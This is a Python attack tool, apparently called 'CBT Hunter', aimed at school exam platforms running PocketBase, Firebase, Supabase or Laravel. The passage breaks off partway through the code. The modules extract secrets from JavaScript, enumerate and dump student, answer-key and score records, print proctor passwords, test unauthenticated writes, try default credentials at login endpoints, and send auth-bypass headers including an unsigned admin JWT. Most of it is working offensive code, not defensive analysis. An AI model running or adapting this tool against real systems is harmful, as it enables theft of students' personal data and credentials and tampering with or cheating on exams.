#!/usr/bin/env python3
"""
CBT Hunter — Specialized CBT/Exam Platform Security Scanner
Target: PocketBase, Firebase, Supabase, Laravel, Django, Custom PHP CBT platforms
Usage:  python3 cbt_hunter.py <url> [--deep] [--dump] [--platform auto|pocketbase|firebase|supabase|laravel]
"""
import sys, json, re, time, ssl, urllib.request, urllib.parse, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

# ═══════════════════════════════════════════
#  COLORS & OUTPUT
# ═══════════════════════════════════════════
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"; M = "\033[95m"; C = "\033[96m"
W = "\033[97m"; D = "\033[90m"; RST = "\033[0m"; BOLD = "\033[1m"

def banner():
    print(f"""{M}{BOLD}
   ██████╗██████╗ ████████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
  ██╔════╝██╔══██╗╚══██╔══╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
  ██║     ██████╔╝   ██║       ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
  ██║     ██╔══██╗   ██║       ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
  ╚██████╗██████╔╝   ██║       ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
   ╚═════╝╚═════╝   ╚═╝       ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
  {D}XC Hacking Hub — CBT/Exam Platform Specialist{RST}
""")

def hit(msg):   print(f"  {R}{BOLD}[JACKPOT]{RST} {Y}{msg}{RST}")
def crit(msg):  print(f"  {R}{BOLD}[CRITICAL]{RST} {msg}")
def high(msg):  print(f"  {Y}{BOLD}[HIGH]{RST} {msg}")
def med(msg):   print(f"  {M}{BOLD}[MEDIUM]{RST} {msg}")
def info(msg):  print(f"  {C}[INFO]{RST} {msg}")
def ok(msg):    print(f"  {G}[+]{RST} {msg}")
def fail(msg):  print(f"  {D}[-]{RST} {msg}")
def section(t): print(f"\n{M}{BOLD}{'═'*60}\n  {t}\n{'═'*60}{RST}")

findings = []

def add_finding(severity, title, detail, data=None):
    findings.append({"severity": severity, "title": title, "detail": detail, "data": data})
    fn = {"CRITICAL": crit, "HIGH": high, "MEDIUM": med, "INFO": info}
    fn.get(severity, info)(f"{title} — {detail}")

# ═══════════════════════════════════════════
#  HTTP HELPERS
# ═══════════════════════════════════════════
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def fetch(url, method="GET", headers=None, data=None, timeout=10, raw=False):
    hdrs = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36",
        "Accept": "application/json, text/html, */*",
    }
    if headers:
        hdrs.update(headers)
    body = None
    if data:
        if isinstance(data, dict):
            body = json.dumps(data).encode()
            hdrs["Content-Type"] = "application/json"
        elif isinstance(data, str):
            body = data.encode()
    try:
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        resp = urllib.request.urlopen(req, timeout=timeout, context=CTX)
        content = resp.read()
        if raw:
            return resp.status, dict(resp.headers), content
        return resp.status, dict(resp.headers), content.decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        content = e.read()
        if raw:
            return e.code, dict(e.headers), content
        return e.code, dict(e.headers), content.decode("utf-8", errors="replace")
    except Exception as e:
        return 0, {}, str(e)

def fetch_json(url, **kw):
    code, hdrs, body = fetch(url, **kw)
    try:
        return code, json.loads(body) if isinstance(body, str) else json.loads(body.decode())
    except:
        return code, body

def base_url(url):
    p = urllib.parse.urlparse(url)
    return f"{p.scheme}://{p.netloc}"

# ═══════════════════════════════════════════
#  MODULE 1: JS SECRET HUNTER
# ═══════════════════════════════════════════
JS_PATTERNS = {
    "pocketbase_url": r'https?://[a-zA-Z0-9._-]+(?:\.web\.id|\.my\.id|\.com|\.io|\.app|\.dev|:\d+)/api/',
    "pocketbase_host": r'["\']https?://(?:pb|pocketbase|api|backend)[a-zA-Z0-9._-]*["\']',
    "firebase_config": r'apiKey\s*[:=]\s*["\']AIza[0-9A-Za-z_-]{35}["\']',
    "firebase_db": r'https?://[a-zA-Z0-9-]+\.firebaseio\.com',
    "firebase_storage": r'[a-zA-Z0-9-]+\.appspot\.com',
    "firebase_auth": r'[a-zA-Z0-9-]+\.firebaseapp\.com',
    "supabase_url": r'https?://[a-zA-Z0-9]+\.supabase\.co',
    "supabase_anon": r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
    "api_key": r'(?:api[_-]?key|apikey|API_KEY)\s*[:=]\s*["\'][a-zA-Z0-9_-]{16,}["\']',
    "secret_key": r'(?:secret|SECRET|password|PASSWORD)\s*[:=]\s*["\'][^"\']{8,}["\']',
    "internal_url": r'https?://(?:10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|localhost|127\.0\.0\.1)[^\s"\'<>]*',
    "jwt_token": r'eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]+',
    "aws_key": r'AKIA[0-9A-Z]{16}',
    "generic_url": r'https?://[a-zA-Z0-9][a-zA-Z0-9._-]*\.[a-zA-Z]{2,}(?::\d+)?(?:/[^\s"\'<>]*)?',
}

CBT_KEYWORDS = [
    "ujian", "exam", "soal", "jawaban", "answer", "question", "quiz",
    "siswa", "student", "guru", "teacher", "pengawas", "proctor",
    "kelas", "class", "nilai", "score", "grade", "cbt", "test",
    "sekolah", "school", "admin", "operator", "pocketbase", "pb",
    "firebase", "supabase", "login", "auth", "token", "password",
    "collection", "record", "data", "api", "backend", "localStorage",
    "userType", "role", "session",
]

def extract_js_urls(html, base):
    js_files = set()
    for pat in [r'src=["\']([^"\']*\.js[^"\']*)["\']', r'href=["\']([^"\']*\.js[^"\']*)["\']']:
        for m in re.finditer(pat, html):
            u = m.group(1)
            if u.startswith("//"):
                u = "https:" + u
            elif u.startswith("/"):
                u = base + u
            elif not u.startswith("http"):
                u = base + "/" + u
            js_files.add(u)
    return js_files

def hunt_js_secrets(target_url):
    section("JS SECRET HUNTER — Decompile & Extract")
    base = base_url(target_url)
    code, hdrs, html = fetch(target_url)
    if code == 0:
        fail(f"Cannot reach {target_url}")
        return {}

    js_urls = extract_js_urls(html, base)
    info(f"Found {len(js_urls)} JS files")

    all_secrets = defaultdict(set)
    all_urls = set()
    cbt_hits = defaultdict(list)

    for js_url in js_urls:
        fname = js_url.split("/")[-1].split("?")[0]
        code, _, js_content = fetch(js_url, timeout=15)
        if code != 200 or not js_content:
            continue

        for name, pattern in JS_PATTERNS.items():
            for m in re.finditer(pattern, js_content):
                val = m.group(0)
                if name == "generic_url":
                    if any(x in val for x in ["w3.org", "mozilla.org", "google.com/fonts",
                                               "googleapis.com/css", "cdnjs.", "unpkg.",
                                               "jsdelivr.", "cloudflare.com/ajax"]):
                        continue
                all_secrets[name].add(val)

        for kw in CBT_KEYWORDS:
            if re.search(rf'\b{kw}\b', js_content, re.I):
                ctx_matches = re.findall(rf'.{{0,40}}{kw}.{{0,40}}', js_content, re.I)
                cbt_hits[kw].extend(ctx_matches[:3])

    for category, values in all_secrets.items():
        if category == "generic_url":
            continue
        for v in values:
            hit(f"[{category}] {v[:120]}")
            if "pocketbase" in category:
                add_finding("CRITICAL", "PocketBase Backend Exposed", f"Found in JS: {v[:120]}")
            elif "firebase" in category:
                add_finding("HIGH", "Firebase Config Exposed", f"Found in JS: {v[:120]}")
            elif "supabase" in category:
                add_finding("HIGH", "Supabase Config Exposed", f"Found in JS: {v[:120]}")
            elif "secret" in category or "aws" in category:
                add_finding("CRITICAL", "Secret/Key Exposed in JS", f"{v[:120]}")
            elif "jwt" in category:
                add_finding("MEDIUM", "JWT Token in JS Source", f"{v[:60]}...")
            elif "internal" in category:
                add_finding("HIGH", "Internal URL Exposed", f"{v[:120]}")

    if cbt_hits:
        ok(f"CBT keywords found: {', '.join(sorted(cbt_hits.keys()))}")

    interesting_urls = set()
    for v in all_secrets.get("generic_url", set()):
        parsed = urllib.parse.urlparse(v)
        if parsed.netloc and parsed.netloc != urllib.parse.urlparse(target_url).netloc:
            interesting_urls.add(v)

    if interesting_urls:
        info(f"External URLs discovered ({len(interesting_urls)}):")
        for u in sorted(interesting_urls)[:20]:
            print(f"    {C}→{RST} {u[:120]}")

    return {
        "secrets": {k: list(v) for k, v in all_secrets.items()},
        "cbt_keywords": dict(cbt_hits),
        "js_files": list(js_urls),
        "external_urls": list(interesting_urls),
    }

# ═══════════════════════════════════════════
#  MODULE 2: PLATFORM DETECTOR
# ═══════════════════════════════════════════
def detect_platform(target_url, js_data=None):
    section("PLATFORM AUTO-DETECT")
    base = base_url(target_url)
    detected = []

    checks = {
        "pocketbase": [
            ("/_/", 200, "PocketBase Admin Panel"),
            ("/api/health", 200, "PocketBase Health"),
            ("/api/collections", None, "PocketBase Collections API"),
        ],
        "firebase": [
            ("/.json", None, "Firebase Realtime DB"),
        ],
        "supabase": [
            ("/rest/v1/", None, "Supabase REST"),
            ("/auth/v1/settings", None, "Supabase Auth"),
        ],
        "laravel": [
            ("/.env", 200, "Laravel .env"),
            ("/telescope", None, "Laravel Telescope"),
            ("/horizon", None, "Laravel Horizon"),
            ("/_debugbar/open", None, "Laravel Debugbar"),
        ],
        "django": [
            ("/admin/", None, "Django Admin"),
            ("/__debug__/", None, "Django Debug Toolbar"),
        ],
        "wordpress": [
            ("/wp-login.php", 200, "WordPress Login"),
            ("/wp-json/wp/v2/", 200, "WordPress REST API"),
        ],
    }

    if js_data:
        secrets = js_data.get("secrets", {})
        if secrets.get("pocketbase_url") or secrets.get("pocketbase_host"):
            detected.append(("pocketbase", 95, "JS decompile — PocketBase URL found"))
        if secrets.get("firebase_config") or secrets.get("firebase_db"):
            detected.append(("firebase", 95, "JS decompile — Firebase config found"))
        if secrets.get("supabase_url"):
            detected.append(("supabase", 95, "JS decompile — Supabase URL found"))

    code, hdrs, body = fetch(target_url)
    powered_by = hdrs.get("X-Powered-By", "").lower()
    server = hdrs.get("Server", "").lower()

    if "express" in powered_by:
        info(f"X-Powered-By: Express (Node.js)")
    if "php" in powered_by:
        info(f"X-Powered-By: PHP")
        detected.append(("laravel", 40, "PHP detected"))
    if "laravel" in (hdrs.get("Set-Cookie", "") + body[:2000]).lower():
        detected.append(("laravel", 70, "Laravel session cookie"))

    for platform, endpoints in checks.items():
        for path, expected_code, desc in endpoints:
            url = base + path
            c, h, b = fetch(url, timeout=8)
            if c == 0:
                continue
            if expected_code and c == expected_code:
                ok(f"{desc} → {c} OK")
                detected.append((platform, 90, f"{desc} accessible"))
            elif c in (200, 301, 302, 401, 403):
                if platform == "pocketbase" and "pocketbase" in b.lower():
                    ok(f"{desc} → PocketBase confirmed")
                    detected.append((platform, 95, f"{desc} confirmed"))
                elif platform == "firebase" and c != 404:
                    ok(f"{desc} → Firebase endpoint exists ({c})")
                    detected.append((platform, 60, f"{desc} exists"))
                elif platform == "laravel" and path == "/.env" and c == 200 and ("APP_KEY" in b or "DB_" in b):
                    hit(f".env EXPOSED!")
                    add_finding("CRITICAL", "Laravel .env Exposed", f"Contains app secrets", b[:500])
                    detected.append((platform, 99, ".env leaked"))
                elif platform == "supabase" and c in (200, 401):
                    ok(f"{desc} → ({c})")
                    detected.append((platform, 70, f"{desc} responds"))

    scores = defaultdict(int)
    reasons = defaultdict(list)
    for plat, score, reason in detected:
        scores[plat] += score
        reasons[plat].append(reason)

    if scores:
        best = max(scores, key=scores.get)
        info(f"Platform detected: {BOLD}{best.upper()}{RST} (confidence: {scores[best]})")
        for plat in sorted(scores, key=scores.get, reverse=True):
            print(f"    {C}→{RST} {plat}: {scores[plat]} — {'; '.join(reasons[plat])}")
        return best
    else:
        info("Platform: UNKNOWN (generic scan will be used)")
        return "generic"

# ═══════════════════════════════════════════
#  MODULE 3: POCKETBASE SCANNER
# ═══════════════════════════════════════════
CBT_COLLECTION_NAMES = [
    "users", "DataUsers", "DataUjian", "DataSoal", "DataJawaban",
    "DataPengawas", "DataKunci", "DataKelas", "DataSekolah",
    "DataGuru", "DataSiswa", "DataNilai", "DataMapel",
    "exams", "questions", "answers", "students", "teachers",
    "proctors", "classes", "schools", "scores", "results",
    "ujian", "soal", "jawaban", "siswa", "guru", "pengawas",
    "kelas", "sekolah", "nilai", "mapel", "kunci",
    "settings", "configs", "logs",
]

def scan_pocketbase(pb_url, deep=False, dump=False):
    section("POCKETBASE SCANNER")
    base = pb_url.rstrip("/")

    code, data = fetch_json(f"{base}/api/health")
    if code == 200:
        ok(f"PocketBase health OK: {json.dumps(data)[:100]}")
    else:
        fail(f"Health check failed ({code})")

    code, _ = fetch(f"{base}/_/")
    if code == 200:
        add_finding("HIGH", "Admin Panel Exposed", f"{base}/_/ returns 200 — PocketBase admin GUI public")
    elif code in (301, 302):
        med(f"Admin panel redirects ({code}) — may require auth")
    else:
        info(f"Admin panel: {code}")

    section("POCKETBASE — COLLECTION ENUMERATION")
    code, data = fetch_json(f"{base}/api/collections")
    collection_list = []

    if code == 200 and isinstance(data, dict) and "items" in data:
        hit(f"Collections API OPEN — {data.get('totalItems', '?')} collections exposed!")
        add_finding("CRITICAL", "Collections API Unauthenticated",
                    f"{data.get('totalItems', '?')} collections listed without auth")
        for col in data.get("items", []):
            name = col.get("name", "?")
            ctype = col.get("type", "?")
            rules = {
                "listRule": col.get("listRule"),
                "viewRule": col.get("viewRule"),
                "createRule": col.get("createRule"),
                "updateRule": col.get("updateRule"),
                "deleteRule": col.get("deleteRule"),
            }
            open_rules = [k for k, v in rules.items() if v == "" or v is None]
            collection_list.append({"name": name, "type": ctype, "open_rules": open_rules})
            status = f"{R}OPEN{RST}" if len(open_rules) >= 3 else f"{Y}PARTIAL{RST}" if open_rules else f"{G}LOCKED{RST}"
            print(f"    {C}→{RST} {name} ({ctype}) — {status} [{', '.join(open_rules) if open_rules else 'all locked'}]")

            if len(open_rules) >= 3:
                add_finding("CRITICAL", f"Collection '{name}' Wide Open",
                            f"Open rules: {', '.join(open_rules)}")
    elif code == 200 and isinstance(data, list):
        hit(f"Collections API OPEN — {len(data)} collections!")
        add_finding("CRITICAL", "Collections API Unauthenticated", f"{len(data)} collections listed")
        for col in data:
            name = col.get("name", "?") if isinstance(col, dict) else str(col)
            collection_list.append({"name": name, "type": "?", "open_rules": []})
            print(f"    {C}→{RST} {name}")
    else:
        info(f"Collections API returned {code} — trying brute force")
        for name in CBT_COLLECTION_NAMES:
            c, d = fetch_json(f"{base}/api/collections/{name}/records?perPage=1")
            if c == 200:
                total = d.get("totalItems", "?") if isinstance(d, dict) else "?"
                ok(f"Collection '{name}' readable — {total} records")
                collection_list.append({"name": name, "type": "base", "open_rules": ["listRule"]})
                add_finding("HIGH", f"Collection '{name}' Readable", f"{total} records accessible without auth")
            elif c == 403:
                fail(f"Collection '{name}' exists but locked (403)")
            elif c == 404:
                pass

    section("POCKETBASE — DATA EXPOSURE CHECK")
    exposed_data = {}
    for col in collection_list:
        name = col["name"]
        c, d = fetch_json(f"{base}/api/collections/{name}/records?perPage=5&sort=-created")
        if c == 200 and isinstance(d, dict):
            total = d.get("totalItems", 0)
            items = d.get("items", [])
            if total > 0:
                ok(f"{name}: {total} records exposed")
                fields = list(items[0].keys()) if items else []
                sensitive_fields = [f for f in fields if any(k in f.lower() for k in
                    ["password", "email", "token", "secret", "key", "phone", "wa", "whatsapp",
                     "jawaban", "answer", "kunci", "nilai", "score", "alamat", "address"])]
                if sensitive_fields:
                    hit(f"Sensitive fields in '{name}': {', '.join(sensitive_fields)}")
                    add_finding("CRITICAL", f"Sensitive Data in '{name}'",
                                f"Fields: {', '.join(sensitive_fields)} — {total} records")
                print(f"    Fields: {', '.join(fields[:15])}")
                if items:
                    print(f"    Sample: {json.dumps(items[0], ensure_ascii=False)[:200]}")
                exposed_data[name] = {"total": total, "fields": fields, "sensitive": sensitive_fields}

                if any(f.lower() in ["password", "pwd", "pass"] for f in fields):
                    for item in items:
                        for f in fields:
                            if f.lower() in ["password", "pwd", "pass"] and item.get(f):
                                hit(f"PLAINTEXT PASSWORD: {f}={item[f]}")
                                add_finding("CRITICAL", "Plaintext Password Storage",
                                            f"Collection '{name}', field '{f}' stores plaintext passwords")
                                break

    c, d = fetch_json(f"{base}/api/collections/DataPengawas/records?perPage=5")
    if c == 200 and isinstance(d, dict) and d.get("items"):
        for item in d["items"]:
            pwd = item.get("password") or item.get("pwd") or item.get("pass")
            user = item.get("username") or item.get("nama") or item.get("name") or item.get("email")
            if pwd:
                hit(f"Proctor creds: {user}:{pwd}")

    section("POCKETBASE — WRITE PERMISSION CHECK")
    for col in collection_list:
        name = col["name"]
        test_data = {"_test_xc": True, "email": "test@xchub.security", "namespace": "xc_security_test"}
        c, d = fetch_json(f"{base}/api/collections/{name}/records", method="POST", data=test_data)
        if c in (200, 201):
            record_id = d.get("id", "?") if isinstance(d, dict) else "?"
            hit(f"WRITE OPEN on '{name}'! Created record: {record_id}")
            add_finding("CRITICAL", f"Unauthenticated Write on '{name}'",
                        f"POST accepted without auth — can inject fake records (test id: {record_id})")
        elif c == 400:
            med(f"'{name}' write: 400 (validation error — write might be open but schema mismatch)")
        elif c == 403:
            fail(f"'{name}' write: locked (403)")

    if dump and exposed_data:
        section("POCKETBASE — DATA DUMP (pagination abuse)")
        for name, meta in exposed_data.items():
            total = meta["total"]
            if total > 1000:
                info(f"Dumping '{name}': {total} records (first 200 for PoC)")
                dump_limit = 200
            else:
                info(f"Dumping '{name}': {total} records")
                dump_limit = total

            all_records = []
            page = 1
            per_page = 50
            while len(all_records) < dump_limit:
                c, d = fetch_json(f"{base}/api/collections/{name}/records?page={page}&perPage={per_page}")
                if c != 200 or not isinstance(d, dict):
                    break
                items = d.get("items", [])
                if not items:
                    break
                all_records.extend(items)
                page += 1
                time.sleep(0.2)

            ok(f"Dumped {len(all_records)} records from '{name}'")
            exposed_data[name]["dumped"] = all_records

    return exposed_data

# ═══════════════════════════════════════════
#  MODULE 4: FIREBASE SCANNER
# ═══════════════════════════════════════════
def scan_firebase(project_id, db_url=None):
    section("FIREBASE SCANNER")

    if db_url:
        base = db_url.rstrip("/")
    else:
        base = f"https://{project_id}.firebaseio.com"

    code, _, body = fetch(f"{base}/.json")
    if code == 200:
        try:
            data = json.loads(body)
            if data and data != "null":
                hit(f"Firebase Realtime DB OPEN — full read without auth!")
                add_finding("CRITICAL", "Firebase DB No Auth", f"Full database readable at {base}/.json")
                if isinstance(data, dict):
                    for key in list(data.keys())[:10]:
                        count = len(data[key]) if isinstance(data[key], (list, dict)) else 1
                        print(f"    {C}→{RST} /{key}: {count} entries")
                return data
        except:
            pass
    elif code == 401:
        info("Firebase DB requires auth (good)")
    else:
        info(f"Firebase DB: {code}")

    paths = [
        "/users.json", "/students.json", "/exams.json", "/questions.json",
        "/answers.json", "/scores.json", "/teachers.json", "/admins.json",
        "/siswa.json", "/guru.json", "/ujian.json", "/soal.json",
        "/jawaban.json", "/nilai.json", "/config.json", "/settings.json",
    ]
    for path in paths:
        c, _, b = fetch(f"{base}{path}")
        if c == 200:
            try:
                d = json.loads(b)
                if d and d != "null":
                    count = len(d) if isinstance(d, (list, dict)) else 1
                    hit(f"Firebase path '{path}' readable — {count} entries!")
                    add_finding("CRITICAL", f"Firebase Path Open: {path}", f"{count} entries accessible")
            except:
                pass

    storage_bucket = f"{project_id}.appspot.com"
    c, _, b = fetch(f"https://firebasestorage.googleapis.com/v0/b/{storage_bucket}/o")
    if c == 200:
        try:
            d = json.loads(b)
            items = d.get("items", [])
            if items:
                hit(f"Firebase Storage OPEN — {len(items)} files listed!")
                add_finding("HIGH", "Firebase Storage Public", f"{len(items)} files accessible")
                for item in items[:10]:
                    print(f"    {C}→{RST} {item.get('name', '?')} ({item.get('contentType', '?')})")
        except:
            pass

    test_data = {"_test": "xc_security_audit", "timestamp": int(time.time())}
    c, _, b = fetch(f"{base}/xc_security_test.json", method="PUT", data=test_data)
    if c == 200:
        hit(f"Firebase DB WRITABLE without auth!")
        add_finding("CRITICAL", "Firebase DB Write Open", "Can write arbitrary data without authentication")
        fetch(f"{base}/xc_security_test.json", method="DELETE")

    return {}

# ═══════════════════════════════════════════
#  MODULE 5: SUPABASE SCANNER
# ═══════════════════════════════════════════
def scan_supabase(supabase_url, anon_key=None):
    section("SUPABASE SCANNER")
    base = supabase_url.rstrip("/")

    c, d = fetch_json(f"{base}/rest/v1/", headers={"apikey": anon_key} if anon_key else {})
    if c == 200:
        ok(f"Supabase REST API accessible")
        if isinstance(d, dict) and d.get("paths"):
            info(f"OpenAPI spec exposed — {len(d['paths'])} endpoints")
    elif c == 401 and not anon_key:
        info("Supabase REST requires API key")

    c, d = fetch_json(f"{base}/auth/v1/settings")
    if c == 200 and isinstance(d, dict):
        ok(f"Auth settings exposed")
        for provider, enabled in d.items():
            if enabled is True:
                print(f"    {C}→{RST} {provider}: enabled")

    cbt_tables = [
        "users", "students", "teachers", "exams", "questions", "answers",
        "scores", "classes", "subjects", "proctors",
        "siswa", "guru", "ujian", "soal", "jawaban", "nilai", "kelas",
        "profiles", "settings",
    ]

    hdrs = {}
    if anon_key:
        hdrs["apikey"] = anon_key
        hdrs["Authorization"] = f"Bearer {anon_key}"

    for table in cbt_tables:
        c, d = fetch_json(f"{base}/rest/v1/{table}?select=*&limit=5", headers=hdrs)
        if c == 200 and isinstance(d, list) and d:
            hit(f"Table '{table}' readable — got {len(d)} rows!")
            add_finding("CRITICAL", f"Supabase RLS Bypass on '{table}'",
                        f"Table readable with anon key — contains {len(d)}+ rows")
            if d:
                fields = list(d[0].keys())
                print(f"    Fields: {', '.join(fields[:15])}")
                print(f"    Sample: {json.dumps(d[0], ensure_ascii=False)[:200]}")
        elif c == 200 and isinstance(d, list) and not d:
            info(f"Table '{table}' exists but empty or RLS blocks rows")

    if anon_key:
        signup_data = {"email": "xc_test@security.test", "password": "XcTest123!@#"}
        c, d = fetch_json(f"{base}/auth/v1/signup", method="POST", data=signup_data,
                          headers={"apikey": anon_key})
        if c in (200, 201) and isinstance(d, dict) and d.get("id"):
            hit("Open registration — can create accounts without restriction!")
            add_finding("HIGH", "Supabase Open Registration", "Anyone can sign up and potentially access data")

    return {}

# ═══════════════════════════════════════════
#  MODULE 6: LARAVEL/PHP SCANNER
# ═══════════════════════════════════════════
def scan_laravel(target_url):
    section("LARAVEL / PHP SCANNER")
    base = base_url(target_url)

    checks = [
        ("/.env", "APP_KEY", "CRITICAL", ".env File Exposed", "Application secrets, DB credentials, API keys leaked"),
        ("/.env.backup", "APP_KEY", "CRITICAL", ".env.backup Exposed", "Backup env file with secrets"),
        ("/.env.example", "APP_KEY", "MEDIUM", ".env.example Contains Secrets", "Example env has real values"),
        ("/storage/logs/laravel.log", "Stack trace", "HIGH", "Laravel Log Exposed", "Error logs with stack traces, paths, queries"),
        ("/telescope", "Telescope", "HIGH", "Laravel Telescope Exposed", "Debug dashboard — requests, queries, exceptions"),
        ("/horizon", "Horizon", "HIGH", "Laravel Horizon Exposed", "Queue dashboard — job data, metrics"),
        ("/_debugbar/open", "debugbar", "HIGH", "Laravel Debugbar Active", "Debug toolbar — queries, variables, session data"),
        ("/phpinfo.php", "phpinfo", "MEDIUM", "phpinfo() Exposed", "PHP configuration, extensions, paths"),
        ("/adminer.php", "Adminer", "CRITICAL", "Adminer DB Manager", "Direct database access via web"),
        ("/phpmyadmin/", "phpMyAdmin", "CRITICAL", "phpMyAdmin Exposed", "Database management interface"),
        ("/.git/config", "[core]", "CRITICAL", ".git Directory Exposed", "Git repo accessible — source code leak"),
        ("/.git/HEAD", "ref:", "CRITICAL", ".git HEAD Exposed", "Git HEAD accessible"),
        ("/vendor/autoload.php", "<?php", "MEDIUM", "Vendor Directory Accessible", "Composer dependencies exposed"),
        ("/storage/app/", "Index of", "HIGH", "Storage Directory Listing", "File storage directory publicly listed"),
        ("/api/documentation", "swagger", "MEDIUM", "API Documentation Exposed", "Swagger/OpenAPI docs public"),
        ("/debug/default/view", "Debug", "HIGH", "Yii/Debug Mode Active", "Framework debug mode"),
    ]

    for path, indicator, severity, title, detail in checks:
        c, h, b = fetch(f"{base}{path}", timeout=8)
        if c == 200 and indicator.lower() in b.lower():
            add_finding(severity, title, f"{base}{path} — {detail}")
        elif c == 200 and path in ["/.env", "/.env.backup"]:
            if any(k in b for k in ["DB_PASSWORD", "MAIL_PASSWORD", "AWS_SECRET", "APP_KEY"]):
                add_finding("CRITICAL", title, f"Contains credentials: {base}{path}")

    c, _, b = fetch(f"{base}/api/nonexistent_endpoint_xc_test_404", timeout=8)
    if c in (404, 500) and ("stack trace" in b.lower() or "exception" in b.lower() or "debug" in b.lower()):
        add_finding("MEDIUM", "Debug Mode Active", "Error responses contain stack traces / debug info")
        if "APP_DEBUG" in b or "whoops" in b.lower():
            add_finding("HIGH", "APP_DEBUG=true in Production", "Laravel debug mode leaks environment variables, queries, paths")

# ═══════════════════════════════════════════
#  MODULE 7: AUTH BYPASS BATTERY
# ═══════════════════════════════════════════
CBT_DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "admin123"), ("admin", "12345678"),
    ("admin", "password"), ("admin", "admin1234"), ("admin", "qwerty"),
    ("administrator", "administrator"), ("administrator", "admin123"),
    ("operator", "operator"), ("operator", "operator123"), ("operator", "12345"),
    ("guru", "guru"), ("guru", "guru123"), ("guru", "12345"),
    ("teacher", "teacher"), ("teacher", "teacher123"),
    ("siswa", "siswa"), ("siswa", "siswa123"), ("student", "student123"),
    ("pengawas", "pengawas"), ("pengawas", "pengawas123"),
    ("proctor", "proctor"), ("proctor", "proctor123"),
    ("test", "test"), ("test", "test123"), ("demo", "demo"), ("demo", "demo123"),
    ("root", "root"), ("root", "toor"), ("superadmin", "superadmin"),
    ("bimasoft", "bimasoft"), ("bimasoft", "Bimasoft123"), ("bimasoft", "bimasoft123"),
    ("cbt", "cbt123"), ("cbt", "cbt"), ("ujian", "ujian123"),
    ("sekolah", "sekolah"), ("sekolah", "sekolah123"),
]

AUTH_BYPASS_HEADERS = [
    {"Authorization": "Bearer null"},
    {"Authorization": "Bearer undefined"},
    {"Authorization": "Bearer "},
    {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0."},
    {"Authorization": "null"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
]

def auth_bypass_battery(target_url):
    section("AUTH BYPASS BATTERY — CBT Specialized")
    base = base_url(target_url)

    protected_paths = [
        "/api/admin", "/api/users", "/api/dashboard", "/api/me", "/api/profile",
        "/api/students", "/api/exams", "/api/questions", "/api/answers",
        "/api/v1/users", "/api/v1/admin", "/api/v1/exams",
        "/admin", "/dashboard", "/panel",
    ]

    info("Testing auth bypass headers on protected endpoints...")
    for path in protected_paths:
        c_normal, _, _ = fetch(f"{base}{path}", timeout=6)
        if c_normal in (401, 403):
            for bypass_hdrs in AUTH_BYPASS_HEADERS:
                c_bypass, _, b = fetch(f"{base}{path}", headers=bypass_hdrs, timeout=6)
                if c_bypass == 200 and len(b) > 50:
                    bypass_name = list(bypass_hdrs.values())[0]
                    hit(f"Auth bypass on {path} with {list(bypass_hdrs.keys())[0]}: {bypass_name}")
                    add_finding("CRITICAL", f"Auth Bypass on {path}",
                                f"Header '{list(bypass_hdrs.keys())[0]}: {bypass_name}' bypasses auth")
                    break

    login_endpoints = [
        "/api/auth/login", "/api/login", "/api/v1/login", "/api/v1/auth/login",
        "/api/admin/login", "/api/guru/login", "/api/siswa/login",
        "/login", "/auth/login", "/api/authenticate",
        "/api/collections/users/auth-with-password",
    ]

    info("Testing default credentials on login endpoints...")
    for endpoint in login_endpoints:
        c, _, _ = fetch(f"{base}{endpoint}", timeout=5)
        if c in (0, 404):
            continue

        ok(f"Login endpoint found: {endpoint} ({c})")

        for user, pwd in CBT_DEFAULT_CREDS[:15]:
            payloads = [
                {"username": user, "password": pwd},
                {"email": f"{user}@admin.com", "password": pwd},
                {"identity": user, "password": pwd},
            ]
            for payload in payloads:
                c, d = fetch_json(f"{base}{endpoint}", method="POST", data=payload)
                if c == 200 and isinstance(d, dict):
                    if d.get("token") or d.get("access_token") or d.get("record") or d.get("user"):
                        hit(f"DEFAULT CRED WORKS: {user}:{pwd} on {endpoint}")
                        add_finding("CRITICAL", "Default Credentials",
                                    f"{user}:{pwd} on {endpoint} — got auth token")
                        break
            else:
                continue
            break

# ═══════════════════════════════════════════
#  MODULE 8: CLIENT-SIDE AUDIT
# ═══════════════════════════════════════════
def client_side_audit(target_url):
    section("CLIENT-SIDE VULNERABILITY HINTS")
    base = base_url(target_url)
    code, hdrs, html = fetch(target_url)
    if code == 0:
        return

    vulns = []

    if "localStorage" in html:
        matches = re.findall(r'localStorage\.(?:setItem|getItem)\(["\']([^"\']+)', html)
        if matches:
            for m in matches:
                vulns.append(f"localStorage key: '{m}'")
                if any(k in m.lower() for k in ["token", "auth", "jwt", "session", "password", "user"]):
                    add_finding("HIGH", f"Sensitive Data in localStorage",
                                f"Key '{m}' — XSS can steal this")

    if "sessionStorage" in html:
        matches = re.findall(r'sessionStorage\.(?:setItem|getItem)\(["\']([^"\']+)', html)
        if matches:
            for m in matches:
                vulns.append(f"sessionStorage key: '{m}'")

    role_patterns = [
        r'userType\s*[=:]\s*["\'](\w+)',
        r'role\s*[=:]\s*["\'](\w+)',
